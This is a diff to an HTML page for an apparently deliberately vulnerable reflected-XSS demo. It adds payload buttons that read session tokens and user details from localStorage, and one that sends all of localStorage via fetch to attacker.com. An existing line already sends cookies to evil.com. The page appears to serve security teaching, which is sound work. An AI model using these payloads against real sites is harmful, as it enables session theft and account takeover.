@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Reflected XSS — Vulnerable</title>
   <link rel="stylesheet" href="/styles.css">
+  <script src="/session-init.js"></script>
 </head>
 <body>
   <nav class="topnav">
@@ -43,6 +44,9 @@
       <button class="payload-tag" data-target="searchInput" data-payload="<img src=x onerror=alert(document.cookie)>">&lt;img src=x onerror=alert(document.cookie)&gt;</button>
       <button class="payload-tag" data-target="searchInput" data-payload='"><svg onload=alert(1)>'>&quot;&gt;&lt;svg onload=alert(1)&gt;</button>
       <button class="payload-tag" data-target="searchInput" data-payload="<script>document.location='http://evil.com?c='+document.cookie</script>">&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</button>
+      <button class="payload-tag" data-target="searchInput" data-payload="<script>alert('=== STOLEN ===\nToken: '+localStorage.sessionToken+'\nUser: '+localStorage.username+'\nRole: '+localStorage.role+'\nEmail: '+localStorage.email)</script>">&lt;script&gt;alert(localStorage token + user + role)&lt;/script&gt;</button>
+      <button class="payload-tag" data-target="searchInput" data-payload="<img src=x onerror=&quot;var d=JSON.stringify(localStorage);alert('Stolen localStorage:\n'+d)&quot;>">&lt;img onerror&gt; dump all localStorage&lt;/img&gt;</button>
+      <button class="payload-tag" data-target="searchInput" data-payload="<script>fetch('http://attacker.com/steal?d='+btoa(JSON.stringify(localStorage)))</script>">&lt;script&gt;exfil localStorage via fetch&lt;/script&gt;</button>
     </div>
 
     <!-- Code comparison -->
